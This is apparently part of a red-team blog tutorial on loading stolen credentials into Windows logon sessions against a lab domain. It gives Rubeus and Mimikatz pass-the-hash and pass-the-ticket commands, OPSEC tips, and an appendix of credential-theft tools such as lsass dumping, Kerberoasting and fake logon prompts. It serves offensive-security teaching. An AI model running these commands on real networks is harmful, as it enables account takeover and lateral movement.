To get started, it is recommended to start with an elevated `cmd.exe` command prompt. Moreover, to differentiate console windows spawned with certain credentials, in my experience it is best to always tag the "base" `cmd.exe` window by using a different color, for example a bright blue background with white text: `color 1f`. Whenever it is needed, from that window all other processes running with different credentials can be killed, and with that all logon sessions with alternative credential material can be cleaned up.

![Different logon sessions](/assets/img/20230815_living-off-the-foreign-land/LogonSessions.png "Different logon sessions")

Something to be aware of in Windows is that processes running in high-integrity (run as Administrator) have a different logon session compared to processes running in medium-integrity. For LOFL, it is recommended to launch a high-integrity `cmd.exe` command prompt. This command prompt, as opposed to a medium-integrity command prompt is recommended because some LOFLCABs require a high-privileged local context to execute, which is perfectly possible because it is the attacker’s Offensive Windows VM on which the processes are executed.

For all types of credentials, it is of key importance that for any type of interaction the Fully Qualified Domain Name (FQDN) is used (e.g., `ad.bitsadmin.com`) as opposed to just the legacy domain name (e.g., `AD`), also known as NetBIOS domain name or Single Label Domain (SLD). The FQDN is required for DNS where the DNS server configured on the Linux router VM is able to direct the DNS requests to the appropriate hosts. Also, Kerberos in the Offensive Windows VM requires the FQDN to be used so it can resolve the relevant DNS records and perform its request to the Kerberos port (88/TCP) of the Domain Controller (DC) hosting the Key Distribution Center (KDC).

An alternative to always using the FQDN, for DNS it is also possible to configure the target domain (`ad.bitsadmin.com`) as the default DNS suffix. This means that whenever for example the `BAK1` (non-FQDN) hostname is used as the target of a command, Windows automatically appends `ad.bitsadmin.com` to it, resulting in the FQDN `BAK1.ad.bitsadmin.com` hostname, which is then resolved over the target network’s DNS server. For OPSEC reasons, be aware that any non-FQDN will be complemented with the DNS suffix, which might lead to unintended resolves against the DNS server in the target environment. This setting can be configured using either the GUI or PowerShell. GUI: `ncpa.cpl` -\> Properties of network adapter -\> Properties of Internet Protocol Version 4 (TCP/IPv4) -\> Advanced -\> DNS -\> Append these DNS suffixes -\> Add: `ad.bitsadmin.com`. PowerShell: `Set-DnsClientGlobalSetting -SuffixSearchList 'ad.bitsadmin.com'` and validate using `Get-DnsClientGlobalSetting`.

In this section two different approaches for loading the credential are discussed for every type of credential:

**1. Spawning a new powershell.exe**

From this `powershell.exe` window any other LOFLCAB which requires those credentials can be executed. For example, from the `powershell.exe` window which is associated with the logon session containing a certain credential material, it is possible to use its cmdlets which then transparently use the authentication provider which contains the relevant credentials. Additionally other LOFLCABs like the Microsoft Management Console (`mmc.exe`) or Sysinternals Active Directory Explorer (`ADExplorer.exe`) can be launched, which when communicating to a remote system which asks for authentication, is transparently taken care of by the authentication packages. The diagram below displays the different logon sessions on the system including logon id, integrity level and user that is used for network authentication. Moreover, it shows it is possible to have multiple different PowerShell windows open, connected to different logon sessions which have credential material for a different user.

![Logonsession hierarchy with PowerShell](/assets/img/20230815_living-off-the-foreign-land/LogonSessions-Console.png "Logonsession hierarchy with PowerShell")

**2. Respawning explorer.exe**

As `explorer.exe` is the GUI of the operating system and many processes spawn under `explorer.exe`, there are some occasions it might be useful to respawn explorer.exe with the credential prepared its logon session.

An example is when you want to browse a SharePoint folder using Windows Explorer. Once `explorer.exe` has relaunched with new credentials, from there Internet Explorer (`iexplore.exe`) can be launched and the SharePoint site visited (which is transparently authenticated to using Kerberos). In a SharePoint it is then possible to navigate to the folder, switch to the classic experience and choose **Open with Explorer** in the **Library** tab. This will then open Windows Explorer, displaying the contents of the folder, which is possible because Windows Explorer is associated with the logon session which contains the relevant credentials.

![Logonsession hierarchy with PowerShell](/assets/img/20230815_living-off-the-foreign-land/LogonSessions-Explorer.png "Logonsession hierarchy with PowerShell")

For this approach it is important to have the "base" `cmd.exe` marked with a different color as described earlier, because otherwise it is hard to return back to a clean logon session in which there are no netonly credentials stored. In this situation, to return to the clean logon session, all application windows on the desktop can be closed, and then the following command-line can be executed to launch `explorer.exe` again from a logon session which does not have netonly credential material in it.

```powershell
taskkill.exe /F /IM explorer.exe & explorer.exe
```

**Validate**

As discussed in the [Offensive setup: Linux routing VM section](/living-off-the-foreign-land-windows-as-offensive-platform#offensive-setup-linux-routing-vm) in part 1, it is good practice to have a network capture running of all interaction with the target network. Such capture can also be used to validate that authentication is performed as expected and other protocols are also working as they are supposed to. In the following subsections, after spawning a PowerShell window or respawning Windows Explorer, it is useful to validate whether the setup works well. An example benign activity that can be performed is to list the network shares of a domain controller:

```powershell
net.exe view \\DC1.ad.bitsadmin.com /all
```

Except in case of the plaintext credentials which only triggers authentication once a network resource is accessed which performs a challenge, at this stage the authentication has already triggered and any output should be visible in the "base" `cmd.exe` displaying the output of the Rubeus and Mimikatz tools. If the network shares are listed successfully, the list of Kerberos tickets can be checked to validate that Kerberos has been used. This can be performed using `klist.exe` and should besides listing the TGT (SPN: `krbtgt/ad.bitsadmin.com`) also list a CIFS (Common Internet Filesystem) SPN, e.g., `cifs/BAK1.ad.bitsadmin.com`.

## Plaintext
The most straight forward credential type are a plaintext username and password. Windows' built-in `runas.exe` utility is able to use these credentials. Because the plaintext password is available, this method supports both authentication via Kerberos and NTLM.

**PowerShell**

The runas command-line looks as follows where the `/netonly` parameter is used and the username is prefixed with the fully qualified domain name (FQDN) of the target domain. In this case the FQDN is `ad.bitsadmin.com`, which is followed by a backslash and the username (`User1`) for which we have the password. After pressing enter, an interactive password prompt will request for the password after which `powershell.exe` is executed using these netonly credentials.

```powershell
runas.exe /netonly /user:ad.bitsadmin.com\User1 powershell.exe
```

In case of plaintext credentials, only once some activity is performed and a challenge for authentication is received, the authentication package will attempt to perform the authentication. If the authentication is successful, it will store the and store the TGT and TGSs that will be received. In case the authentication fails, the LOFLCAB which initiated the authentication will report that the authentication failed (in case of `net.exe` it will state: Access is denied.) while on the network level the response to the Kerberos AS-REQ will likely be either `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` in case a non-existing username is used or `KRB5KDC_ERR_PREAUTH_FAILED` in case the user's password is incorrect.

**Respawn Windows Explorer**

The following command-line is used to first kill all explorer.exe instances, and then relaunch it with a new logon session and specified credentials.

```powershell
taskkill.exe /F /IM explorer.exe & runas.exe /netonly /user:ad.bitsadmin.com\User1 "C:\Windows\explorer.exe /NoUACCheck"
```

## TGT
When using a ticket granting ticket (TGT), Rubeus needs to be used. Rubeus provides the option to create a netonly process using a TGT stored in a `.kirbi` file or provided as a base64 string on the command-line. Because the Negotiate authentication package is used, the authentication might still fall back on NTLM authentication. However, because only a TGT is provided, there is no such credential material available.

It *is* possible to execute Rubeus with the `/ticket` parameter for authentication, omitting the `/domain`, `/username` and `/password` parameters, however in that case Rubeus will generate a random domain, username and password itself and provide those to the authentication package. This is however bad for OPSEC reasons as the username will be visible in the logs of the target domain. For that reason, it is recommended to specify the correct domain and the `/username` parameter with the user of the TGT. Finally, any password can be used as there is probably no legitimate password available. As discussed in the Offensive setup: Offensive Windows VM section, an alternative is to disable the fallback to NTLM to avoid such failed NTLM authentication altogether.

**PowerShell**

The Rubeus command-line to launch PowerShell using a TGT looks as follows.

```powershell
Rubeus.exe createnetonly /domain:ad.bitsadmin.com /username:User1 /password:dummy /ticket:C:\tmp\User1.kirbi /program:powershell.exe /show
```

**Respawn Windows Explorer**

The following command-line kills all `explorer.exe` instances and then relaunches it with a new logon session with the TGT injected into it.

```powershell
taskkill.exe /F /IM explorer.exe & Rubeus.exe createnetonly /domain:ad.bitsadmin.com /username:User1 /password:dummy /ticket:C:\tmp\User1.kirbi /program:"C:\Windows\explorer.exe /NoUACCheck"
```

## Certificate
For certificate-based authentication again Rubeus can be used. To make the authentication work, the `/domain` parameter needs to be provided with the FQDN of the target domain. Moreover, the `/password` parameter is required in case the `.pfx` file is password-protected. If the certificate has been imported in the offensive Windows' store, instead of providing the path to the certificate, the certificate thumbprint can be used also be used as parameter for the `/certificate` parameter. Like with the TGT/TGS authentication, because the Negotiate authentication package is used, the authentication might still fall back on NTLM authentication where the same implications apply as with the TGT/TGT authentication.

**PowerShell**

The following command-line can be used to launch PowerShell making use of certificate-based authentication.

```powershell
Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:User1 /certificate:C:\tmp\User1.pfx /password:PFXPass1! /createnetonly:powershell.exe /show
```

**Respawn Windows Explorer**

The following command-line kills all `explorer.exe` instances and then relaunches it with a new logon session which uses certificate-based authentication.

```powershell
taskkill.exe /F /IM explorer.exe & Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:Install /certificate:C:\tmp\User1.pfx /password:PFXPass1! /createnetonly:"C:\Windows\explorer.exe /NoUACCheck" /show
```

## NTLM hash
An NTLM hash, also known as RC4 hash, can both be used for Kerberos and NTLM authentication. To support the use for both occasions, a combination of Mimikatz and Rubeus is used where Mimikatz takes care of the NTLM authentication while Rubeus takes care of the Kerberos authentication.

**PowerShell**

The Rubeus command-line to launch PowerShell using a NTLM hash which supports both Kerberos authentication and NTLM fallback looks as follows.

```powershell
set domain=ad.bitsadmin.com
set user=User1
set rc4=BEB7BFC1623370D9CD19DEB26C69097B

mimikatz.exe privilege::debug "sekurlsa::pth /domain:%domain% /user:%user% /ntlm:%rc4% /run:"""powershell.exe -NoExit -Command """""""""Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /ptt""""""""""""" exit
```

**Respawn Windows Explorer**

The following command-line kills all `explorer.exe` instances and then using both Mimikatz and Rubeus relaunches it with a new logon session with the NTLM hash and Kerberos ticket injected into it.

```powershell
set domain=ad.bitsadmin.com
set user=User1
set rc4=BEB7BFC1623370D9CD19DEB26C69097B

taskkill /F /IM explorer.exe & mimikatz.exe privilege::debug "sekurlsa::pth /domain:%domain% /user:%user% /ntlm:%rc4% /run:"""cmd.exe /c Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /ptt ^& start C:\Windows\explorer.exe /NoUACCheck"""" exit
```

## AES128/AES256 hash
Besides authenticating using an NTLM hash, it is also possible to authenticate to Active Directory using an AES128 or AES256 hash and obtain a TGT. In case in addition to the AES hash an NTLM hash is available, the command-line from the NTLM hash subsection can be updated to prepare a PowerShell window or Windows Explorer session with both the NTLM hash for fallback to NTLM authentication and a TGT requested using the AES hash. Wherever the `/aes256` parameter is mentioned for an AES256 hash, it can be replaced with the `/aes128` parameter for an AES128 hash.

**PowerShell**

The following command-line can be used to launch PowerShell making use of authentication using an AES256 hash.

```powershell
Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:User1 /aes256:CE6559D565EF9B5AFCFFC8F75709DAA854832D1951D6E38E21084FE22962BF62 /createnetonly:powershell.exe /show
```

**Respawn Windows Explorer**

The following command-line kills all `explorer.exe` instances and then relaunches it with a new logon session which requests a TGT using an AES256 hash.

```powershell
taskkill.exe /F /IM explorer.exe & Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:User1 /aes256:CE6559D565EF9B5AFCFFC8F75709DAA854832D1951D6E38E21084FE22962BF62 /createnetonly:"C:\Windows\explorer.exe /NoUACCheck" /show
```

[^17]: <https://learn.microsoft.com/en-us/windows/win32/secauthn/lsa-logon-sessions>
[^18]: <https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw>
[^19]: <https://learn.microsoft.com/en-us/windows/win32/secauthn/ssp-packages-provided-by-microsoft>
[^20]: <https://learn.microsoft.com/en-us/sysinternals/downloads/logonsessions>


# Conclusion
This concludes the part two in which both the Offensive Windows VM has been configured as well as credential material has been obtained and prepared. **[Part 3 of this article](/living-off-the-foreign-land-windows-as-offensive-platform-part-3)**, which is the final part, will discuss how to now use this setup to perform reconnaissance and offensive activities on the target network.


# Appendix B: Credential types and tools

| **Type**    | **Approach**                           | **Url**                                              | **Command-line**                                                                                                                             |
|-------------|----------------------------------------|------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|
| Plaintext   | Fake logonscreen                       | <https://github.com/bitsadmin/fakelogonscreen>       | `FakeLogonScreen.exe`                                                                                                                          |
| Plaintext   | Fake login prompt                      | <https://github.com/shantanu561993/SharpLoginPrompt> | `SharpLoginPrompt.exe`                                                                                                                         |
| Plaintext   | Create computer account                | <https://github.com/FuzzySecurity/StandIn>           | `StandIn.exe --computer DESKTOP-B1T54DM --make`                                                                                                |
| Plaintext   | Internal monologue                     | <https://github.com/eladshamir/Internal-Monologue>   | `InternalMonologue.exe`                                                                                                                        |
| Plaintext   | DPAPI masterkeys                       | <https://github.com/leftp/DPAPISnoop>                | `DPAPISnoop.exe`                                                                                                                                       |
| Plaintext   | Kerberoast                             | <https://github.com/GhostPack/Rubeus>                | `Rubeus.exe kerberoast /user:TargetUser`                                                                                                       |
| Plaintext   | ASEP Roast                             | <https://github.com/GhostPack/Rubeus>                | `Rubeus.exe asreproast /user:TargetUser`                                                                                                       |
| TGT         | TGT delegation                         | <https://github.com/GhostPack/Rubeus>                | `Rubeus.exe tgtdeleg /nowrap`                                                                                                                  |
| TGS         | Steal TGS from memory                  | <https://github.com/GhostPack/Rubeus>                | `Rubeus.exe dump /nowrap /user:TargetUser /service:TargetService`                                                                              |
| Certificate | Add shadow credential                  | <https://github.com/eladshamir/Whisker>              | `Whisker.exe add /target:TargetUser`                                                                                                           |
| Certificate | Request certificate from ADCS template | <https://github.com/GhostPack/Certify>               | `Certify.exe find`                                                                                                                             |
| Certificate | SharpAltSecIds                         | <https://github.com/bugch3ck/SharpAltSecIds>         | `SharpAltSecIds.exe a /target:TargetUser "/altsecid:X509:<I>DC=com,DC=bitsadmin,DC=ad,CN=LabSubCA1<S>DC=com,DC=bitsadmin,DC=ad,CN=mycert"` |
| Hash        | Elevante and obtain hashes from lsass  | <https://github.com/gentilkiwi/mimikatz>             | `mimikatz.exe privilege::debug sekurlsa::logonpasswords exit`                                                                                  |


# References
